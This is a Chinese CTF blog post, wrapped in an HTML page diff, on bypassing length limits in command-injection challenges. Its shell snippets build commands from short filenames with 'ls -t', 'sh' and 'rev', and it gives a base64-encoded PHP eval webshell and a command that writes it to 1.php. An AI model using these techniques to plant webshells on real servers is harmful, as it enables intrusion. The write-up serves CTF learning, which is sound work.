@@ -1,0 +1,362 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha256-XOqroi11tY4EFQMR9ZYwZWKj5ZXiftSx36RRuC3anlA=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.20.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="前言打了一下nepnep的CTF，发现有几道题都是和长度有关系，虽然做题的时候都是用很常规的方式去绕过的，没有想到这么妙的方法，（好像这些方法和很早就有了）记录一下吧。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="和长度有关的命令执行">
+<meta property="og:url" content="http://example.com/2021/03/22/%E5%92%8C%E9%95%BF%E5%BA%A6%E6%9C%89%E5%85%B3%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/index.html">
+<meta property="og:site_name" content="My0n9s&#39;blog">
+<meta property="og:description" content="前言打了一下nepnep的CTF，发现有几道题都是和长度有关系，虽然做题的时候都是用很常规的方式去绕过的，没有想到这么妙的方法，（好像这些方法和很早就有了）记录一下吧。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://i.loli.net/2021/03/22/QBVrvCmOXKqkow9.png">
+<meta property="og:image" content="https://i.loli.net/2021/03/22/sUiSyLvk9d6blKQ.png">
+<meta property="og:image" content="https://i.loli.net/2021/03/22/j2BdFtUAJ6lYC4y.png">
+<meta property="og:image" content="https://i.loli.net/2021/03/23/zCnf7EwQ1SbkZPm.png">
+<meta property="og:image" content="https://i.loli.net/2021/03/23/jWcRpi5TQF7A4ft.png">
+<meta property="article:published_time" content="2021-03-22T12:03:32.000Z">
+<meta property="article:modified_time" content="2024-09-08T03:57:38.000Z">
+<meta property="article:author" content="My0n9s">
+<meta property="article:tag" content="命令执行">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2021/03/22/QBVrvCmOXKqkow9.png">
+
+
+<link rel="canonical" href="http://example.com/2021/03/22/%E5%92%8C%E9%95%BF%E5%BA%A6%E6%9C%89%E5%85%B3%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://example.com/2021/03/22/%E5%92%8C%E9%95%BF%E5%BA%A6%E6%9C%89%E5%85%B3%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/","path":"2021/03/22/和长度有关的命令执行/","title":"和长度有关的命令执行"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>和长度有关的命令执行 | My0n9s'blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">My0n9s'blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%83%E4%B8%AA%E5%AD%97%E7%AC%A6"><span class="nav-number">1.1.</span> <span class="nav-text">七个字符</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%94%E4%B8%AA%E5%AD%97%E7%AC%A6"><span class="nav-number">1.2.</span> <span class="nav-text">五个字符</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9B%E4%B8%AA%E5%AD%97%E7%AC%A6"><span class="nav-number">1.3.</span> <span class="nav-text">四个字符</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%99%E5%9C%A8%E6%9C%80%E5%90%8E"><span class="nav-number">1.4.</span> <span class="nav-text">写在最后</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="My0n9s"
+      src="/images/touxiang.jpeg">
+  <p class="site-author-name" itemprop="name">My0n9s</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">76</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/03/22/%E5%92%8C%E9%95%BF%E5%BA%A6%E6%9C%89%E5%85%B3%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/touxiang.jpeg">
+      <meta itemprop="name" content="My0n9s">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="My0n9s'blog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="和长度有关的命令执行 | My0n9s'blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          和长度有关的命令执行
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2021-03-22 20:03:32" itemprop="dateCreated datePublished" datetime="2021-03-22T20:03:32+08:00">2021-03-22</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2024-09-08 11:57:38" itemprop="dateModified" datetime="2024-09-08T11:57:38+08:00">2024-09-08</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Web/" itemprop="url" rel="index"><span itemprop="name">Web</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>打了一下nepnep的CTF，发现有几道题都是和<strong>长度</strong>有关系，虽然做题的时候都是用很常规的方式去绕过的，没有想到这么妙的方法，（好像这些方法和很早就有了）记录一下吧。</p>
+<span id="more"></span>
+
+<h2 id="七个字符"><a href="#七个字符" class="headerlink" title="七个字符"></a>七个字符</h2><p>先来看看七个字符的吧，如果给了你一个限制，只能让你以最多7个长度来，你怎么做？怎么去写shell</p>
+<p>这里有一个很妙的方法，利用拼接，先来看一个例子，我想去构造一个<code>echo TXkwbjlz|base64 -d</code>的命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;\ -d\\</span><br><span class="line">&gt;ase64\\</span><br><span class="line">&gt;lz\|b\\</span><br><span class="line">&gt;Xkwbj\\</span><br><span class="line">&gt;ho\ T\\</span><br><span class="line">&gt;ec\\</span><br><span class="line">ls -t&gt;0</span><br><span class="line">sh 0</span><br></pre></td></tr></table></figure>
+
+<p>看一下0文件的内容：</p>
+<p><img src="https://i.loli.net/2021/03/22/QBVrvCmOXKqkow9.png" alt="hack1.png"></p>
+<p>然后 sh 0 去执行的时候，一开始遇到0，会报错，但并不影响后面命令的执行，\起到一个拼接的作用，最后拼接出来的效果就是：</p>
+<p><code>echo TXkwbjlz|base64 -d</code>  ，可以看到效果图如下：</p>
+<p><img src="https://i.loli.net/2021/03/22/sUiSyLvk9d6blKQ.png" alt="hack.png"></p>
+<p>可以发现成功输出，核心的思想就是利用拼接，在linux系统里面 \ 起到一个连接的作用。需要注意的几个地方</p>
+<ul>
+<li>利用<code>&gt;h</code> 可以直接生成一个名为h的文件</li>
+<li>空格需要转义 一下</li>
+<li>反斜杠也需要转义一下，不然系统会认为是命令没执行完。<code>ls -t</code> 将文件按照创建的时间排序列出，这个很关键，不然很难保证我们能正确拼接成功。</li>
+<li>因为是按照创造时间顺序进行拼接，所以我们开始构造文件名的时候，是按照逆序来的。</li>
+</ul>
+<p>当然我们也可以用这个方法直接写个一句话木马 <code>&lt;?php eval($_POST[cmd]);</code>  base64编码一下为:<code>PD9waHAgZXZhbCgkX1BPU1RbY21kXSk7</code> </p>
+<p>然后我们构造一个命令：</p>
+<p><code>echo PD9waHAgZXZhbCgkX1BPU1RbY21kXSk7|base64 -d &gt;1.php</code> </p>
+<p>构造方法和上面是一样的。</p>
+<h2 id="五个字符"><a href="#五个字符" class="headerlink" title="五个字符"></a>五个字符</h2><p>思路和7个是差不多的，每一次创建的文件名都可以压缩一下长度，只不过是需要执行的次数多了一些，关键就在于最后的</p>
+<p><code>ls -t&gt;0</code>  这是7个字符，可以想办法转换一下，用较短的长度去构造一下这个命令，然后执行一下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;l\\</span><br><span class="line">&gt;s\\</span><br><span class="line">&gt;\ \\</span><br><span class="line">&gt;-t\\</span><br><span class="line">&gt;\&gt;0\\</span><br><span class="line">ls&gt;a</span><br><span class="line">ls&gt;&gt;a</span><br></pre></td></tr></table></figure>
+
+<p>这里用到了<code>&gt;&gt;</code> 追加的方法，因为直接ls&gt;a，我们可以看到顺序是<code>&#39; \&#39;  &#39;&gt;0\&#39;  &#39;l\&#39;  &#39;s\&#39;  &#39;-t\&#39;</code>，然后追加以后，我们可以cat a看到：<img src="https://i.loli.net/2021/03/22/j2BdFtUAJ6lYC4y.png" alt="hack3.png"></p>
+<p>成功凑出来<code>ls -t&gt;0</code> 这个命令，只需要 <code>sh 0</code> 就可以达到 <code>ls -t&gt;0</code>的效果，剩下的就是按照前面的方式构造命令。</p>
+<p>不过这个方法会有一个局限，因为是用顺序拼接出来的，如果当前目录存在其他文件名，<code>ls</code> 这个默认会有一个排序，顺序会对结果造成一定的影响，比如我模拟存在<code>index.php和shell.php</code>的情况：</p>
+<p><img src="https://i.loli.net/2021/03/23/zCnf7EwQ1SbkZPm.png" alt="hackforfun.png"></p>
+<p>可以看到<code>shell.php</code> 卡在了 <code>ls\</code> 和 <code> </code> 还有<code>ls\</code> 和<code>-t\</code> 的中间。这样就拼接不成功了。</p>
+<h2 id="四个字符"><a href="#四个字符" class="headerlink" title="四个字符"></a>四个字符</h2><p>四个字符的局限就是 <code>ls&gt;&gt;a</code> 这个用不了了。</p>
+<p>不过这里有另外一种构思，利用<code>dir 、*、rev</code> </p>
+<p>执行<code>*</code>  会把第一个文件名当做是命令，然后后面的文件名都是参数。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;dir</span><br><span class="line">&gt;sl</span><br><span class="line">&gt;g\&gt;</span><br><span class="line">&gt;ht-</span><br><span class="line">*&gt;v</span><br><span class="line">&gt;rev</span><br><span class="line">*v&gt;x <span class="comment">//这里执行了rev v &gt;x</span></span><br></pre></td></tr></table></figure>
+
+<p>执行后，发现成功构造：</p>
+<p><img src="https://i.loli.net/2021/03/23/jWcRpi5TQF7A4ft.png" alt="hack5.png"></p>
+<p>但是似乎也有局限，我尝试了本地含有index.php也乱了。</p>
+<h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><p>这个是限制了长度，本质是命令执行，只要长度可控，后面的我们可以用正常的命令执行的思路，所以这里可以除了 写马，也可以反弹shell。 复现的环境是ubuntu。在该环境下仍然发现了很多限制，就是当前目录一开始就有一些文件名的话，可能一定程度上会造成干扰，不过对于7字符似乎就没有这个顾虑。</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="tag"># 命令执行</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2021/03/18/PDO%E9%A2%84%E7%BC%96%E8%AF%91%E4%B8%8EMVC%E5%88%9D%E6%8E%A2/" rel="prev" title="PDO预编译与MVC初探">
+                  <i class="fa fa-angle-left"></i> PDO预编译与MVC初探
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2021/03/25/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%B0%8Ftrick/" rel="next" title="命令执行小trick">
+                  命令执行小trick <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">My0n9s</span>
+  </div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
